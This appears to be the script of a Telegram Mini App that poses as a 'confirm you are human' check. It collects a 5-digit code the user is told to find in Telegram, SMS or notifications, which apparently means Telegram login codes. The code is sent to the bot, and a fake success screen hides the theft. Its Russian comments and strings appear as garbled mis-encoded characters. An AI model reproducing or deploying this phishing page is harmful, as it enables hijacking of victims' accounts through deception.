    <script>
        // Telegram Web App
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.expand();
            tg.ready();
            console.log('Telegram Web App –≥–æ—Ç–æ–≤');
        }
        
        // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let code = '';
        let timeLeft = 300; // 5 –º–∏–Ω—É—Ç
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã
        const screen1 = document.getElementById('screen1');
        const screen2 = document.getElementById('screen2');
        const confirmBtn = document.getElementById('confirmBtn');
        const learnBtn = document.getElementById('learnBtn');
        const codeInputs = document.getElementById('codeInputs');
        const keyboard = document.getElementById('keyboard');
        const timer = document.getElementById('timer');
        const timeSpan = document.getElementById('time');
        const errorMsg = document.getElementById('errorMsg');
        const loading = document.getElementById('loading');
        const success = document.getElementById('success');
        
        // –ö–Ω–æ–ø–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        confirmBtn.addEventListener('click', () => {
            screen1.style.display = 'none';
            screen2.style.display = 'block';
            
            // –°–æ–æ–±—â–∞–µ–º –±–æ—Ç—É
            if (tg) {
                tg.sendData(JSON.stringify({
                    action: 'human_confirmed',
                    time: Date.now()
                }));
            }
            
            // –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
            createKeyboard();
            updateCodeDisplay();
            startTimer();
        });
        
        // –ö–Ω–æ–ø–∫–∞ "–£–∑–Ω–∞—Ç—å –∫–æ–¥"
        learnBtn.addEventListener('click', () => {
            alert("üîç –ö–æ–¥ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏:\n\n1. –í –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Telegram\n2. –í –°–ú–° —Å–æ–æ–±—â–µ–Ω–∏–∏\n3. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è");
        });
        
        // –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
        function createKeyboard() {
            const keys = [
                ['1', '2', '3'],
                ['4', '5', '6'],
                ['7', '8', '9'],
                ['‚å´', '0', '‚úì']
            ];
            
            keyboard.innerHTML = '';
            
            keys.forEach(row => {
                row.forEach(key => {
                    const btn = document.createElement('div');
                    btn.className = 'key';
                    btn.textContent = key;
                    
                    if (key === '‚å´') {
                        btn.classList.add('delete');
                        btn.addEventListener('click', deleteDigit);
                    } else if (key === '‚úì') {
                        btn.classList.add('submit');
                        btn.addEventListener('click', submitCode);
                    } else {
                        btn.addEventListener('click', () => addDigit(key));
                    }
                    
                    keyboard.appendChild(btn);
                });
            });
        }
        
        // –î–æ–±–∞–≤–∏—Ç—å —Ü–∏—Ñ—Ä—É
        function addDigit(digit) {
            if (code.length < 5) {
                code += digit;
                updateCodeDisplay();
                hideError();
            }
        }
        
        // –£–¥–∞–ª–∏—Ç—å —Ü–∏—Ñ—Ä—É
        function deleteDigit() {
            if (code.length > 0) {
                code = code.slice(0, -1);
                updateCodeDisplay();
                hideError();
            }
        }
        
        // –û–±–Ω–æ–≤–∏—Ç—å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∫–æ–¥–∞
        function updateCodeDisplay() {
            const boxes = codeInputs.querySelectorAll('.code-box');
            boxes.forEach((box, i) => {
                if (i < code.length) {
                    box.textContent = code[i];
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                    box.classList.remove('filled');
                }
            });
        }
        
        // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
        function submitCode() {
            if (code.length !== 5) {
                showError('–ù—É–∂–Ω–æ 5 —Ü–∏—Ñ—Ä');
                return;
            }
            
            if (timeLeft <= 0) {
                showError('–í—Ä–µ–º—è –≤—ã—à–ª–æ');
                return;
            }
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            screen2.style.display = 'none';
            loading.style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –±–æ—Ç–∞
            const data = {
                action: 'verify_code',
                code: code,
                timestamp: Date.now()
            };
            
            if (tg) {
                tg.sendData(JSON.stringify(data));
                
                // –£—Å–ø–µ—Ö
                setTimeout(() => {
                    loading.style.display = 'none';
                    success.style.display = 'block';
                    
                    // –ó–∞–∫—Ä—ã—Ç—å
                    setTimeout(() => {
                        tg.close();
                    }, 2000);
                }, 1500);
            } else {
                // –î–ª—è —Ç–µ—Å—Ç–∞
                console.log('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º:', data);
                loading.style.display = 'none';
                success.style.display = 'block';
            }
        }
        
        // –¢–∞–π–º–µ—Ä
        function startTimer() {
            updateTimer();
            
            const interval = setInterval(() => {
                if (timeLeft > 0) {
                    timeLeft--;
                    updateTimer();
                } else {
                    clearInterval(interval);
                    showError('–í—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ');
                }
            }, 1000);
        }
        
        function updateTimer() {
            const min = Math.floor(timeLeft / 60);
            const sec = timeLeft % 60;
            timeSpan.textContent = `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
        }
        
        function showError(msg) {
            errorMsg.textContent = msg;
            errorMsg.style.display = 'block';
        }
        
        function hideError() {
            errorMsg.style.display = 'none';
        }
        
        // –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ
        document.addEventListener('paste', (e) => {
            e.preventDefault();
            const text = (e.clipboardData || window.clipboardData).getData('text');
            const numbers = text.replace(/\D/g, '');
            
            if (numbers.length >= 5) {
                code = numbers.slice(0, 5);
                updateCodeDisplay();
                hideError();
            }
        });
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', () => {
            console.log('Mini App –∑–∞–≥—Ä—É–∂–µ–Ω');
        });
    </script>
</body>
